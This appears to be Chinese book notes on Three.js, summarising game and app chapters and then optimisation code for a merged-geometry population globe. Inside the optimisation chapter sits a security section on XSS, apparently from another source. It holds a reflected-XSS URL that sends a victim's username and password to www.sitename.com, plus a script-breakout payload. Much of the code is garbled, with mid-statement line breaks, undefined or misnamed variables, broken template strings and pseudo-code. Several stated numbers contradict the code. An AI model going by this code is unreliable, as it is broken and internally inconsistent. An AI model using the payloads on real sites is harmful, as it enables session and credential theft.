# 第2章 应用开发I

游戏例子参考了

https://blog.logrocket.com/creating-game-three-js/，应该就是这页面的代码。

https://github.com/flutterfromscratch/threejs-rocket-game，这里应该是源码。

## 总结

使用 Three.js 开发游戏，意味着你可以触达数量庞大的潜在用户群体。由于玩家无需在设备上下载或安装任何内容，只需通过浏览器即可直接游玩，这种方式在游戏开发与分发上显得极具吸引力。
在本章中，我们已经了解到：为广泛用户群体打造一个引人入胜且富有趣味性的游戏体验，是完全可行的。

## NOTES

1. Three.js-Webgl ocean.
2. Water.js-Three.js, GitHub.Inc.
3. Three.js webgl-Sky+Sun Shader-Three.js examples.
4. Nipplejs TS-npm.
5. Creating a game in Three.js-Lewis Cianci, Log Spacecraft.
6. Three js-Spacecraft-Game-flutterfromscratch.

# 第3章 应用开发II

我们将使用 Three.js 为一个购物网站打造令人惊艳的 3D 效果

## 总结

Three.js 是一个 JavaScript 工具库，它让在网页上创建 3D 视觉效果变得比直接使用 WebGL 简单得多。Three.js 是目前互联网上最受欢迎的 3D JavaScript 库，而且使用起来非常简便。本章的目的是帮助你理解如何使用 Three.js 来构建 3D Web 应用程序。Three.js 为我们提供了丰富多样的 3D 图形功能选项。通过本章，我们还能看到一些富有创意的网站示例，这些案例可以作为灵感来源，帮助我们利用 Three.js JavaScript 库创建并制作出令人惊叹的、基于浏览器的 3D 视觉效果与动画。

## NOTES

1. Creating a scene-Three.js manual.
2. 60 mindblowing THREEJS Website Examples-Henri, Bashooka.

# 第4章 应用开发III

在上一章中，我们探讨了如何使用 WebGL 和 Three.js 进行应用程序开发。在本节中，我们将了解另一个基于 Three.js 的应用开发案例——“粉丝亲和力”（Fan Affinity）应用。

体育与娱乐营销是一个节奏飞快、持续变化且不断扩张的行业，尤其是在新技术不断涌现的背景下。如今，利用技术手段来增强你的营销分析和数据管理工具，从而拓展并维系你的粉丝群体，比以往任何时候都更加重要。你的粉丝是你实现长期成功最关键的因素。如果你想有效扩大粉丝规模并与他们建立深度互动，就需要主动走到他们所在的地方。

由于几乎人人都拥有智能手机、电脑、平板或其他电子设备，因此借助技术无疑是最佳选择。无论是在比赛、歌曲发布或电影上映之前、期间还是之后，与支持者保持联系都可以变得非常简单。

鉴于如今智能手机的普及，为你的歌曲开发一款移动应用无疑会成为粉丝们手机主屏上受欢迎的新增内容。移动应用是一种绝佳的方式，无论粉丝身处观众席还是窝在沙发上，都能让他们轻松访问你的歌曲、购买演出门票和周边商品、观看视频，并浏览他们喜爱的音乐人幕后花絮等内容，从而持续聚焦并深度参与你的音乐世界。你还可以在应用中引导用户在社交媒体上“点赞”或“关注”你，并告知他们歌曲专属的话题标签（hashtag）。你越是展现出每位粉丝对你的团队有多么重要，他们就越有可能长期支持你。Three.js 之所以成为一个广受欢迎的开源项目，自有其充分理由。它彻底改变了我们在网页上与 3D 内容互动的方式，并自 2013 年首次发布以来不断优化升级。当你突破网页二维的限制，使用这个库来构建一个 3D 世界时，其实过程相当简单，但效果却依然令人感觉如同魔法般惊艳。接下来，让我们从基础开始——首先快速概览一下这款应用的整体结构。

## 使用 Three.js 构建应用程序

Jee Martin 于 2012 年 3 月发布了一款小型 Spotify 应用程序，以庆祝 Metronomy 乐队新专辑《Small World》的发行。该应用允许听众通过关联自己的 Spotify 账户，探索“Metronomy 小世界中的八大奇观”。应用会分析用户收听《Small World》原声带的频率——如果 Metronomy 的歌曲出现在用户最近播放的前 50 首音乐中次数越多，解锁的惊喜内容也就越多。这是一款小巧而精巧的应用，不仅鼓励用户分享和传播，还融入了 Lee O’Connor 创作的视觉图形。

值得一提的是，这也是自 Spotify 开始要求所有第三方集成必须经过官方审核以来，首个成功上线的 Spotify 应用。幸运的是，审核流程非常顺利，我们的应用在一天之内就获得了批准。虽然与 Spotify 团队建立联系会有所帮助，但在开发你的互动活动之前，请务必充分了解平台的各项限制和规范。

类似的应用也已为 Greta Van Fleet、Girl in Red 和 Hurts 等艺人开发过。他（指 Jee Martin）已经总结并实践了创建这类“粉丝亲和力”Spotify 应用的大部分策略。

现在，让我们从第一个 Spotify 应用开始——使用 Three.js 开发《Small World》应用。

## 总结

尽管目前还有其他 3D JavaScript 库可供选择，但只需简单地在 Google 上搜索一下就会发现，Three.js 是最受欢迎的库，在大多数排行榜上都位居第一。截至撰写本文时，它在 GitHub 上拥有庞大的社区支持，贡献者超过 1,500 人，并且每月都会进行修复和更新，稳定性相当可靠。更不用说，其官方网站提供了几乎数不清的开源示例——如果你在某个问题上卡住了，很可能在那里就能找到答案。

本章帮助我们了解了如何创建一个粉丝版 Spotify 应用程序，该应用能够追踪歌曲的播放量、下载量，并结合粉丝忠诚度测试等功能。
我们建议你也亲自探索一下其他库，因为它们或许更适合你的特定目标。不过，对于绝大多数 3D 项目而言，Three.js 很可能已经包含了你所需的一切功能。

# 第5章 代码优化

**本章内容**
➢ 高效代码编写
➢ 大型对象优化
➢ 动画优化
➢ 通用技巧  

在前一部分中，我们学习了如何使用 Three.js 构建 Web 应用程序。开发应用程序通常需要编写大量代码，而这些代码只有在无错误、结构合理的情况下，才能高效且正确地运行。

## 编写优化且高效的代码

在编写各种示例和教程时，当我们把作品在较旧或低端设备上进行测试，经常会遇到诸多性能问题。

## 在开始测量性能结果之前

首先，我们必须能够评估应用程序的性能表现。建议使用 GitHub 上提供的 **stats 模块**——这是一个轻量级的小型库，可帮助我们在页面中添加一个性能监控面板。

### 选择 Web 浏览器

JavaScript 是一种解释型语言，也是我们 Three.js 应用程序的基础。因此，浏览器的 JavaScript 引擎将直接执行我们的代码。由于市场上存在多种不同的 Web 浏览器，而代码运行的速度与所使用的浏览器密切相关。

在 WebGL 和 Three.js 方面表现尤为出色的浏览器是 **Google Chrome**。

### 减少场景中的多边形数量

优化过程最基本、最初始的方法，就是控制场景中所使用的多边形数量。在每次 3D 渲染执行时，处理器都需要负责绘制场景中的所有对象。而执行过程中需要处理的多边形数量与系统负载成正比。

通过以下代码，我们可以简单地输出当前场景中的三角形（多边形）数量：

```javascript
console.log("三角形数量：", renderer.info.render.triangles);
```

场景的复杂度越低，应用程序的性能就越好。对此，我们有两种主要策略：

- **从场景中移除部分 3D 对象**  
- **减少 3D 对象中的多边形数量，从而简化模型**

在第一种方法中，我们只需对场景进行筛选，删除一些不必要的 3D 对象即可。

第二种方法则更为细致。我们需要借助 3D 建模软件，尽可能多地移除模型中多余的面片。例如，所有被遮挡、摄像机无法看到的面都可以安全删除。

某些建模软件（如 Blender）甚至提供了自动简化 3D 模型的功能，可帮助我们快速降低模型的多边形数量。

### 关闭抗锯齿（Anti-Aliasing）

在渲染引擎中禁用抗锯齿是一种简单有效的方法，可以在牺牲少量画质（表现为边缘出现可见的锯齿像素）的前提下，显著提升应用程序的性能。抗锯齿的作用是平滑 3D 物体的轮廓，使最终渲染效果更加细腻清晰——虽然效果出色，但会增加处理器的负担！

我们可以通过 Three.js 渲染器的 `antialias` 属性来启用或禁用抗锯齿功能：

```javascript
// 启用抗锯齿
renderer = new THREE.WebGLRenderer({ antialias: true });

//---------------------
// 禁用抗锯齿
renderer = new THREE.WebGLRenderer({ antialias: false });
```

因此，禁用抗锯齿是快速提升 Three.js 项目性能的一种简便手段。

## 限制 3D 渲染的分辨率

另一种提升 Three.js 应用性能的简单方法是在 3D 渲染过程中降低分辨率（即减少计算的像素数量）。这种方法非常有效，但会明显牺牲图像质量。因此，建议仅在其他优化手段无效时，将其作为最后的备选方案。

我们可以通过 Three.js 渲染器的 `setPixelRatio` 方法来调整渲染分辨率：

```javascript
// 默认值（使用设备原生像素比）
renderer.setPixelRatio(window.devicePixelRatio);
```

通过修改像素比（pixel ratio），我们可以减少需要计算的像素数量，从而降低最终输出的分辨率。例如，以下代码将渲染分辨率提高至设备原生分辨率的 2.5 倍（注：此处原文表述有误，实际是 *降低* 分辨率应使用小于 1 的系数；但根据上下文逻辑，作者可能意指“降低有效分辨率”，但示例写法存在混淆）：

```javascript
// 降低分辨率（注：此处数值逻辑需澄清）
renderer.setPixelRatio(window.devicePixelRatio * 2.5);
```

不过，这里需要特别说明：**若要降低渲染分辨率以提升性能，应使用小于 1 的系数**，例如：

```javascript
// 实际降低分辨率的正确做法
renderer.setPixelRatio(window.devicePixelRatio * 0.8);
```

如你所见，帧率（FPS）可能从 24 大幅提升至 60，但画面质量会显著下降。

请注意，该数值可根据需求调整：例如，设置像素比为 0.8 时，画质损失远不如设为 2.5 那样明显（再次强调，2.5 实际会提高分辨率，与优化目标相悖），但对 FPS 的提升效果也相对较小。因此，在性能与画质之间需根据实际场景权衡取舍。

## Three.js 对大量对象的优化

Three.js 可以通过多种方式进行性能优化，其中一种常用方法被称为“几何体合并”（Merging Geometry）。
在 Three.js 中，你创建的每个 Mesh（网格）都会触发一次或多次系统绘制调用。即使最终视觉效果相同，创建两个独立对象所需的开销也远大于绘制一个合并后的对象。因此，将多个网格合并为一个，是提升渲染效率、节省性能的有效手段。

让我们来看一个适用此方法的典型示例：构建一个新的 WebGL 地球仪（WebGL Globe）。
使用我们的 Three.js 应用程序以每秒 60 帧（fps）的速度渲染 3D 场景，能够带来流畅且愉悦的用户体验。然而，这一目标有时却难以实现。

第一步是收集数据。据相关资料，WebGL Globe 所使用的数据来自 SEDAC（社会经济数据与应用中心）。当我访问该网站时，注意到人口统计数据是以网格形式呈现的，其分辨率为 60 分钟（即 1 度）精度。随后我仔细查看了这些数据——情况确实如此。

```
ncols 460
nrows 155
xllcorner -170
yllcorner -90
cellsize 0.99999999999995
NODATA_value -9999
-888 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -9999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -999 -999
-999 -999...
-999 -999 -999 -999 -999 -999 -999 -999 -9999 -9999
-9999 -9999...
-9999 -9999 -9999 -9999 -9999 -9999 -9999 -9999 -9999
-9999 -9999 -9999...
9.241768 8.790958 2.095345 -9999 0.05114867 -9999
-9999 -9999 -9999 -999...
1.287993 0.4395509 -9999 -9999 -9999 -9999 -9999
-9999 -9999 -9999 -9999...
-9999 -9999 -9999 -9999 -9999 -9999 -9999 -9999 -9999
-9999 -9999 -9999...
```

文件中的一些行以键值对（key/value pairs）的形式存在，随后是若干行数据，每行对应网格中一行的数据点，每个数据点占一个值。为了确保我们正确理解这些数据，先尝试将其在二维平面上绘制出来。

首先，我们需要一段代码来加载这个文本文件：

```javascript
async function loadFile(url) {
    const req = await fetch(url);
    return req.text();
}
```

上述代码会返回一个 Promise，其中包含指定 URL 处文件的内容。

接下来，我们需要一些代码来解析该文件：

```javascript
function parseData(text) {
    const data = [];
    const settings = { data };
    let max;
    let min;

    // 按行分割文本
    text.split('\n').forEach((line) => {
        // 按空白字符分割每一行
        const parts = line.trim().split(/\s+/);

        if (parts.length === 5) {
            // 如果有 5 个部分，应为键值对
            settings[parts[0]] = parseFloat(parts[1]);
        } else if (parts.length > 5) {
            // 如果超过 5 个部分，则为数据行
            const values = parts.map((v) => {
                const value = parseFloat(v);
                if (value === settings.NODATA_value) {
                    return undefined; // 无效数据用 undefined 表示
                }
                max = Math.max(max === undefined ? value : max, value);
                min = Math.min(min === undefined ? value : min, value);
                return value;
            });
            data.push(values);
        }
    });

    return Object.assign(settings, { min, max });
}
```

上述解析函数返回一个对象，其中包含文件中的所有键值对、一个名为 `data` 的属性（存储全部数据，组织成一个大型二维数组），以及整个数据集的最小值（`min`）和最大值（`max`）。

接下来，我们还需要编写一些代码来可视化这些数据。

```js
function drawData(file) {
  const { min, max, data } = file;
  const range = max - min;
  const ctx = document.querySelector('canvas').
    getContext('2d');
  // the canvas should be the same size as the data
  ctx.canvas.width = ncols;
  ctx.canvas.height = nrows;
  // but display it double size so it's not too small
  ctx.canvas.style.width = px(ncols * 2);
  ctx.canvas.style.height = px(nrows * 2);
  // fill the canvas to dark gray
  ctx.fillStyle = '#444';
  ctx.fillRect(2, 2, ctx.canvas.width, ctx.canvas.
    height);
  // draw each data point
  data.forEach((row, latNdx) => {
    row.forEach((value, lonNdx) => {
      if (value === undefined) {
        return;
      }
      const amount = (value - minimum) / range;
      const hue = 2;
      const saturation = 15;
      const lightness = amount;
      ctx.fillStyle = hsl(hue, saturation, lightness);
      ctx.fillRect(lonNdx, latNdx, 15, 15);
    });
  });
}
function px(v) {
  return '${v | 0}px';
}
function hsl(h, s, l) {
  return 'hsl(${h * 360 | 0},${s * 100 | 0}%,${l * 100 | 0}%)';
}
```

最后，将所有内容整合在一起：

```javascript
loadFile('resources/data/gpw/gpw-v4-basic-demographic-characteristics-rev10_a000_014_2010_1_deg_asc/gpw_v4_basic_demographic_characteristics_rev10_a000_014mt_2010_cntm_1_deg.asc')
    .then(parseData)
    .then(drawData);
```

就能得到如下结果。¹ 看起来运行正常！现在让我们看看它在 3D 中的效果。

我们将为文件中的每个数据点创建一个立方体（box）。首先从“按需渲染”（rendering on demand）的代码开始。我们先创建一个带有世界地图纹理的简单球体，效果如下图所示。

以下是相关的初始化代码：

```javascript
{
    const loader = new THREE.TextureLoader();
    const texture = loader.load('resources/images/world.jpg', render);
    const geometry = new THREE.SphereBufferGeometry(1, 64, 32);
    const material = new THREE.MeshBasicMaterial({ map: texture });
    scene.add(new THREE.Mesh(geometry, material));
}
```

请注意，当纹理加载完成后，会调用 `render` 函数。因为我们采用的是按需渲染（而非持续循环渲染），所以只需在纹理加载完毕后渲染一次即可。

接下来，我们需要修改原先为每个数据点绘制一个点（dot）的代码，将其改为为每个数据点创建一个立方体（box）。

```js
function addBoxes(file) {
  const { min, max, data } = file;
  const range = max - min;
  // make one box geometry
  const boxWidth = 15;
  const boxHeight = 15;
  const boxDepth = 15;
  const geometry = new THREE.BoxBufferGeometry
    (boxWide, boxHigh, boxDeep);
  // make it so it scales away from the positive C
  axis
  geometry.applyMatrix(new THREE.Matrix4().
    makeTranslation(1, 1, 0.75));
  // make it so that goes away from of the C axis that is positive
  // We can rotate the lon helper to the longitude on its B axis.
  const lonHelper = new THREE.Object3D();
  scene.add(lonHelper);
  // We rotate the latHelper on its A axis to the
  latitude
  const latHelper = new THREE.Object3D();
  lonHelper.add(latHelper);
  // The object is moved to the sphere's edge via the position helper
  const positionHelper = new THREE.Object3D();
  positionHelper.position.z = 1;
  latHelper.add(positionHelper);
  const lonFudge = Math.PI * .5;
  const latFudge = Math.PI * -0.135;
  data.forEach((row, latNdx) => {
    row.forEach((value, lonNdx) => {
      if (value === undefined) {
        return;
      }
      const amount = (value - minimum) / range;
      const material = new THREE.MeshBasicMaterial();
      const hue = THREE.Math.lerp(0.75, 0.35, amount);
      const saturation = 10;
      const lightness = THREE.Math.lerp(0.15, 10.0,
        amount);
      material.color.setHSL(hue, saturation,
        lightness);
      const mesh = new THREE.Mesh(geometry, material);
      scene.add(mesh);
      // Adjust the assistants to point at the latitude and longitude coordinates
      lonHelper.rotation.y = THREE.Math.
        degToRad(lonNdx + file.xllcorner) + lonFudge;
      latHelper.rotation.x = THREE.Math.
        degToRad(latNdx + file.yllcorner) + latFudge;
      // use the world matrix of the position helper
      to
      // position this mesh.
      positionHelper.updateWorldMatrix(true, false);
      mesh.applyMatrix(positionHelper.matrixWorld);
      mesh.scale.set(0.005, 0.005, THREE.Math.
        lerp(0.01, 0.5, amount));
    });
  });
}
```

从我们的测试绘图代码来看，整体逻辑其实相当直接。我们创建一个立方体，并将其中心沿正 Z 轴方向移开。如果不这样做，立方体会以自身中心为基准进行缩放；而我们希望它们是从球体原点向外“生长”的。

当然，我们也可以通过为每个立方体添加多个 THREE.Object3D 父对象来解决这个问题。Object3D 对象类似于场景图（scene graph）节点，但随着节点数量增加，场景图的性能会逐渐下降。

因此，我们构建了一个小型的辅助层级结构：`lonHelper`、`latHelper` 和 `positionHelper`。这些辅助对象用于计算立方体在球面上的正确位置。

虽然我们完全可以手动计算地球上每个点的位置，但采用这种层级辅助方式可以将大部分复杂的数学运算交给 Three.js 库处理，从而省去我们的负担。

具体做法是：为每个数据点创建一个 `MeshBasicMaterial` 和对应的 `Mesh`，然后获取 `positionHelper` 的世界矩阵（world matrix），并将其应用到新创建的网格上。最后，在新位置对网格进行缩放。

理论上，我们可以为每一个新立方体都分别创建一套 `latHelper`、`lonHelper` 和 `positionHelper`，但那样效率会低得多。

我们计划最多创建 368 × 125 = 46,000 个立方体。不过由于部分数据点被标记为 “NO DATA”（无数据），实际构建的立方体数量大约只有 15,000 个。
如果为每个立方体都额外创建 3 个辅助对象，那么场景图中将包含约 60,000 个节点，JavaScript 就需要为每一个节点单独计算位置。
而通过复用同一组辅助对象来定位所有网格，我们节省了大约 40,000 次操作，显著提升了性能。

关于 `lonFudge` 和 `latFudge` 这两个参数需要稍作说明：
`lonFudge` 的值是 π/4（即四分之一圈），这是合理的——它仅仅表示纹理或纹理坐标在全球范围内的起始偏移位置不同。
而另一方面，我并不完全确定为什么 `latFudge` 需要设为 -0.135；这个数值只是经过调试后发现能让立方体与纹理对齐得更好而已。

最后一步，就是调用我们的加载器：

```javascript
loadFile('resources/data/gpw/gpw-v4-basic-demographic-characteristics-rev10_a000_014_2010_1_deg_asc/gpw_v4_basic_demographic_characteristics_rev10_a000_014mt_2010_cntm_1_deg.asc')
    .then(parseData)
    .then(addBoxes)
    .then(render);
```

由于我们采用的是按需渲染（on-demand rendering），因此在数据加载和解析完成后，至少需要手动调用一次 `render()` 来显示结果。

你会注意到，拖动上面的示例来旋转场景时，响应非常迟缓。我们可以通过打开浏览器开发者工具（DevTools）并启用帧率监控器（frame rate meter）来查看当前帧率。在我的设备上，帧率甚至低于 20 fps。

这样的体验显然不够流畅，而且很多用户的设备性能可能比我这台更弱，问题会更加严重。因此，我们必须进行优化。

针对这个问题，我们可以将所有立方体合并成一个单一的几何体（geometry）。目前我们大约绘制了 19,000 个独立的立方体；如果将它们全部合并为一个几何体，就能节省约 18,999 次绘制调用（draw calls）。

以下是将所有立方体合并为单一几何体的更新代码。

```js
function addBoxes(file) {
  const { min, max, data } = file;
  const range = max - min;
  // These assistants will make it simple to place the boxes
  // The lon helper can be rotated to the longitude on its Y axis
  const lonHelper = new THREE.Object3D();
  scene.add(lonHelper);
  //The latHelper is rotated on its A axis to the
  latitude
  const latHelper = new THREE.Object3D();
  lonHelper.add(latHelper);
  // The object is moved to the sphere's edge via the position helper
  const positionHelper = new THREE.Object3D();
  positionHelper.position.c = 10;
  latHelper.add(positionHelper);
  // Used to adjust the box's centre so that it scales from the C axis location.
  const originHelper = new THREE.Object3D();
  originHelper.position.z = 0.5;
  positionHelper.add(originHelper);
  const lonFudge = Math.PI * .5;
  const latFudge = Math.PI * -0.135;
  const geometries = [];
  data.forEach((row, latNdx) => {
    row.forEach((value, lonNdx) => {
      if (value === undefined) {
        return;
      }
      const amount = (value - min) / range;
      const boxWidth = 1;
      const boxHeight = 1;
      const boxDepth = 1;
      const geometry = new THREE.BoxGeometry(boxWidth,
        boxHeight, boxDepth);
      // Adjust the assistants to point at the latitude and longitude coordinates
      lonHelper.rotation.y = THREE.MathUtils.
        degToRad(lonNdx + file.xllcorner) + lonFudge;
      latHelper.rotation.x = THREE.MathUtils.
        degToRad(latNdx + file.yllcorner) + latFudge;
      // use the origin helper's world matrix to locate this geometry
      positionHelper.scale.set(0.0075, 0.0075, THREE.
        MathUtils.lerp(0.01, 0.5, amount));
      originHelper.updateWorldMatrix(true, false);
      geometry.applyMatrix4(originHelper.matrixWorld);
      geometries.push(geometry);
    });
  });
  const mergedGeometry = BufferGeometryUtils.
    mergeBufferGeometries(
      geometries, false);
  const material = new THREE.MeshBasicMaterial({
    color:
      'red'
  });
  const mesh = new THREE.Mesh(mergedGeometry,
    material);
  scene.add(mesh);
}
```

我们删除了之前用于修改立方体几何体中心点的代码，改用一个 `originHelper` 来处理位置偏移。
此前，我们重复使用了同一个几何体 19,000 次；而这一次，我们为每一个立方体都创建了全新的几何体。由于我们打算使用 `applyMatrix` 方法直接对每个立方体几何体的顶点进行变换，那么不如一次性完成这个操作，而不是重复两次。

最后，我们将包含所有几何体的数组传递给 `BufferGeometryUtils.mergeBufferGeometries`，该方法会将它们全部合并成一个单一的网格（mesh）。此外，我们还需要引入 `BufferGeometryUtils` 工具模块。

```javascript
import * as BufferGeometryUtils from '/examples/jsm/utils/BufferGeometryUtils.js';
```

现在，在我的机器上至少能达到 60 帧每秒（fps）了，说明优化是有效的。
但因为所有立方体现在合并成了一个单一网格（mesh），我们只能使用一种材质（material），也就是说整个模型只能显示一种颜色——而之前每个立方体都可以拥有不同的颜色。

我们可以通过使用**顶点颜色**（vertex colors）来解决这个问题。

顶点颜色为每个顶点分配一个颜色值。通过为每个立方体的各个顶点指定特定的颜色，就能让每个立方体呈现出不同的色调。

```javascript
const color = new THREE.Color();
```

## 优化大量动画对象

这是之前一篇关于优化大量对象文章的延续。如果你尚未完成前面的步骤，请先完成后再继续。在上一篇文章中，我们将大约 19,000 个立方体合并成了一个单一的几何体。这样做极大地优化了渲染性能（将原本 19,000 次绘制调用减少为一次），但也带来了一个明显的缺点：难以单独控制每个立方体的运动。

根据我们想要实现的效果，有多种解决方案。在本场景中，我们的目标是**加载多组不同的数据集，并在它们之间进行动画切换**。

第一步是收集多组数据。理想情况下，我们可能会在离线阶段对数据进行预处理；但目前，我们先加载两组真实数据，并在此基础上生成另外两组（或直接使用这两组进行演示）。

这是我们之前的加载代码：

```text
'resources/data/gpw/gpw v4 basic demographic characteristics rev10 a000 014mt 2010 cntm 1 deg.asc'
if (parseData)
then(additionalBoxes)
then(render);
```

现在，我们将其改为如下方式：

```javascript
async function loadData(info) {
    const text = await loadFile(info.url);
    info.file = parseData(text);
}

async function loadAll() {
    const fileInfos = [
        {
            name: 'male',
            hueRange: [0.75, 0.35],
            url: 'resources/data/gpw/gpw_v4_basic_demographic_characteristics_rev10_a000_014mt_2010_cntm_1_deg.asc'
        },
        {
            name: 'women',
            hueRange: [0.95, 1.15],
            url: 'resources/data/gpw/gpw_v4_basic_demographic_characteristics_rev10_a000_014ft_2010_cntm_1_deg.asc'
        },
    ];
    await Promise.all(fileInfos.map(loadData));
    // ...后续处理
}

loadAll();
```

这段新代码使用 `async/await` 和 `Promise.all` 并行加载多个数据文件，并将解析后的结果存储在各自的 `info.file` 属性中，为后续的动画切换和可视化做好准备。

上述代码加载完 `fileInfos` 中所有文件后，`fileInfos` 中的每个对象都会拥有一个 `file` 属性，其中包含已加载并解析后的数据。我们稍后会用到其中的 `name` 和 `hueRange`：`name` 将用于用户界面（UI）中的标签显示，而 `hueRange` 则用于指定一个色相范围，以便将数据映射为对应的颜色。

截至 2010 年，上面提到的两个文件似乎分别表示每个区域的男性和女性人口数量。需要注意的是，我并不确定这些数据是否完全准确，但这其实并不重要——最关键的是能够展示不同的数据集。

接下来，我们再生成两组新的数据集：  

- 一组表示“男性人数多于女性”的区域；  
- 另一组则表示“女性人数多于男性”的区域。

为此，我们先定义一个辅助函数：

```javascript
function mapValues(data, fn) {
    return data.map((row, rowNdx) => {
        return row.map((value, colNdx) => {
            return fn(value, rowNdx, colNdx);
        });
    });
}
```

这个 `mapValues` 函数类似于普通的 `Array.map` 方法，但它适用于二维数组（数组的数组）。它会对每个元素调用传入的函数 `fn`，并传入当前值、行索引（`rowNdx`）和列索引（`colNdx`）作为参数。

现在，我们可以编写一些代码，通过比较两个原始数据文件来生成一个新的数据集。

```javascript
function makeDiffFile(baseFile, otherFile, compareFn) {
    let min;
    let max;
    const baseData = baseFile.data;
    const otherData = otherFile.data;

    const data = mapValues(baseData, (base, rowNdx, colNdx) => {
        const other = otherData[rowNdx][colNdx];
        if (base === undefined || other === undefined) {
            return undefined;
        }
        const value = compareFn(base, other);
        min = Math.min(min === undefined ? value : min, value);
        max = Math.max(max === undefined ? value : max, value);
        return value;
    });

    // 复制 baseFile，并用新计算出的 min、max 和 data 替换原有值
    return { ...baseFile, min, max, data };
}
```

上述代码使用 `mapValues` 函数，根据传入的比较函数 `compareFn` 对两个数据集进行逐元素对比，从而生成一组新的数据。同时，它还会记录这些对比结果中的最小值（`min`）和最大值（`max`）。最后，它返回一个新对象：该对象复制了 `baseFile` 的所有属性，但将 `min`、`max` 和 `data` 替换为新计算得到的值。

现在，我们可以利用这个函数来创建两组新的数据集。

## 加固与安全

在过去的几个月里，我一直在研究安全编码实践，并尝试以简单易懂的方式向社区普及相关知识。每当谈及我们每天所见到的大量不安全代码时，大家都会认同一句老话：“预防胜于治疗。” 确保代码和应用程序安全的最佳方式，就是在编写之初就正确地实现安全性。  

编写安全的代码并不困难——程序员只需清楚在哪些关键位置加入安全检查即可。通常，这仅需多写几行代码，却足以保护你的应用免受大量常见威胁的侵害。

因此，本期《如何编写安全代码？》将聚焦于**跨站脚本（Cross-Site Scripting, XSS）**问题。在现代浏览器中，**内容安全策略**（Content Security Policy, CSP）能显著降低 XSS 攻击的风险和影响。

跨站脚本是一种安全漏洞，攻击者可借此向其他用户正在浏览的网页中注入未经授权的 JavaScript、VBScript、HTML 或其他活动内容。通过这种方式注入的恶意脚本可以劫持用户的会话、代表用户执行非法操作、窃取敏感信息，甚至篡改页面内容。XSS 是当今针对互联网应用程序最具破坏性且最普遍的攻击形式之一。恶意访客可利用 XSS 随意操控你网站上的文本和代码——而这些操作本应只有你（网站所有者）才有权限执行。

以下代码就是一个典型的 XSS 攻击示例：用户输入未经任何净化处理，直接作为参数使用：

```java
String firstNameParameter = (String) request.getParameter("firstName");
```

用户的输入被直接存储到局部变量 `firstNameParameter` 中，并在 HTTP 响应中未经输出编码就发送回浏览器。  

在本章中，我将介绍几种你在日常开发中可能频繁遇到的攻击类型及其防御方法，并详细说明如何有效防范这些安全威胁。

### 反射型 XSS（XSS Reflection）

对每一位受害者而言，这种攻击都是灾难性的。当恶意载荷（payload）被发送给受害者后，一旦他们点击了包含恶意代码的 URL，攻击者就能获取其 Cookie 和其他敏感数据。

以下是一个典型的恶意载荷示例：如果受害者访问了该链接，攻击者便能窃取其个人信息：

```
https://mybank.com/submitForm.do?customer=<script>function+stealCredentials(){location.href="www.sitename.com?name=document.myform.username.value&password=document.myform.pword.value"}</script>
```

> **注**：整个脚本应作为 URL 的一部分完整提供；此处为了便于阅读，将其分行展示。

另一种常见场景是访问一个声称可生成密码的网站。乍看之下，页面似乎很安全——用户只需点击“生成密码”按钮即可。
然而，如果我们使用 Burp Suite 这样的代理工具，在 Proxy 标签页中拦截该请求，并将其发送到 Repeater 标签页以仔细检查请求和响应内容，就会发现问题。

例如，我们发出的第一个请求如下所示，可以清楚地看到：我们在请求参数中提交的用户名，被原样“反射”回了响应内容中。

既然确认了用户名会被反射回来，我们就可以在 `value` 字段中注入自己的恶意载荷。剩下的唯一任务，就是构造一段能够被正确执行的 payload。

例如：

```javascript
";catch(e){}alert('injected');try(a="
```

这段代码利用了 JavaScript 语法结构（如 try/catch）来绕过某些过滤机制，从而成功触发 `alert('injected')`，证明存在 XSS 漏洞。

## 通用优化建议

- 在 JavaScript 中，对象创建的开销较大，因此**不要在循环中创建对象**。应预先创建一个对象（例如 `Vector3`），然后在循环内部通过 `vector.set()` 或类似方法重复使用它。
- **渲染循环**（render loop） 同样适用上述原则。为了确保程序以流畅的 60 FPS 运行，应在渲染循环中尽可能减少工作量。新对象应尽量避免频繁创建，只在必要时偶尔生成。
- **始终优先使用 `BufferGeometry` 而非 `Geometry`**，因为前者性能更高、速度更快。
- 对于内置几何体，**务必使用基于 Buffer 的版本**（例如使用 `BoxBufferGeometry` 而不是 `BoxGeometry`）。
- **始终尽量复用对象**，如网格、材质、纹理等（尽管某些情况下更新已有对象可能比创建新对象更慢——关于纹理的具体建议请参见下文）。

## 使用国际单位制（SI 单位）

- 在 JavaScript 中，**处处都应使用国际单位制**（SI Units）。你会发现，如果你也采用 SI 单位，开发过程会更加顺畅。如果确实需要使用其他单位（比如英寸——光是想想就让人发抖），请确保你有充分且合理的理由。

### SI 单位的具体应用：

- **距离**以米（m）为单位（在 Three.js 中，1 个单位 = 1 米）。
- **时间**以秒（s）为单位。
- **光照**使用 SI 光度单位：坎德拉（cd）、流明（lm）和勒克斯（lx）——前提是启用了 `renderer.physicallyCorrectLights`。
- 如果你在构建真正宏大尺度的场景（例如太空模拟），请考虑使用**缩放因子**或切换到**对数深度缓冲**（logarithmic depth buffer）。

------

### 准确的颜色处理

要获得（近乎）准确的颜色，请设置以下渲染器参数：

```javascript
renderer.gammaFactor = 2.2;
renderer.outputEncoding = THREE.sRGBEncoding;
```

对于颜色对象，应进行如下转换：

```javascript
const color = new THREE.Color(0x800080);
color.convertSRGBToLinear();
```

更常见的场景是材质颜色的处理：

```javascript
const material = new THREE.MeshBasicMaterial({ color: 0x800080 });
material.color.convertSRGBToLinear();
```

最后，**仅对颜色贴图**（color map） 设置编码为 sRGB，以获得（近乎）正确的纹理颜色：

```javascript
import { sRGBEncoding } from "./vendor/three/build/three.module.js";

const colorMap = new THREE.TextureLoader().load("colorMap.jpg");
colorMap.encoding = sRGBEncoding;
```

**所有其他类型的纹理**（如法线贴图、粗糙度贴图等） 应保持在线性颜色空间中。由于这是默认设置，因此除了颜色贴图、环境贴图（environment map）和自发光贴图（emissive map）之外，你无需更改其他纹理的编码。

